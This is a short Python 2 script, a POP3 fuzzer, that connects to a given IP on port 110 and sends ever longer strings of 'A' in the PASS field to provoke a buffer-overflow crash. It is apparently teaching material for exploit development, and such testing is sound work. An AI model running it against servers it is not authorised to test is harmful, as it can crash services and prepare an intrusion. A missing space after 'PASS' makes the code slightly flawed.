#!/usr/bin/env python
import socket
import sys

if len(sys.argv) < 2:
  print "[*] Simple Python POP3 fuzzer" 
  print "[*] Usage:"+sys.argv[0]+" <ip addr>"
  sys.exit()

buffer = ["A"]
counter = 100
while len(buffer) <= 30:
  buffer.append("A" * counter)
  counter = counter + 200

for string in buffer:
  print "[*] Fuzzing PASSWORD field with %s bytes" % len(string)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect = s.connect((str(sys.argv[1]), 110))
  s.recv(1024)
  s.send('USER rekt\r\n')
  s.recv(1024)
  s.send('PASS' + string + '\r\n')
  s.send('QUIT\r\n')
  s.close()
